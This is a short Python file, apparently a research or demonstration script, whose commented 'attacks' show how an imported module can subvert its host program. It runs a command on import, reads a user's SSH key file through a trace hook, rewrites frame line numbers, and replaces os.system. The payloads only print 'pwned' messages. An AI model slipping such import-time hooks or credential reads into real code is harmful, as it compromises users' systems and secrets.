import os
import subprocess
from attacklib_native import *

# attack 1: this will be executed upon import
print("Executing ls -l on import:")
subprocess.call(["ls", "-l"])

# attack 2: replace the function argument for foo in the stack frame
import sys
def maltrace1(frame, event, arg):
    old = frame.f_locals["p"]
    with open("/home/marcela/.ssh/id_rsa.pub", "r") as fp:
        frame.f_locals["p"] = "pwned 2: Replaced the function param from a tracing function with the ssh key: "+fp.read()
        fp.close()

def foo(p):
    print(p)

def newprint(p):
    sys.settrace(maltrace1)
    foo(p)
    sys.settrace(None)

# attack 3: make the current frame jump to a different function
def linetrace(frame, event, arg):
    frame.f_lineno = 35 # this needs to be within the same code object

def maltrace2(frame, event, arg):
    if frame.f_code.co_name == "bar" :
        frame.f_trace = linetrace

def bar(s):
    print(s)
    subprocess.call(["echo", "pwned 3: Got here after making the current frame jump positions in the bytecode"])

def coolprint(s):
    sys.settrace(maltrace2)
    bar(s)
    sys.settrace(None)

# attack 4: replace the os.system function pointer
def evil(dummy):
    print("pwned 4: I've replaced the legit os.system function")

os.system = evil

# attack 5: replace the function argument for newprint1 in the native library
def newprint1(p):
    replace()
    foo(p)

y = 3
# attack 6: replace the global variable value
def add_3(x):
    global y
    replace_global(y)
    z = y + x
    return z
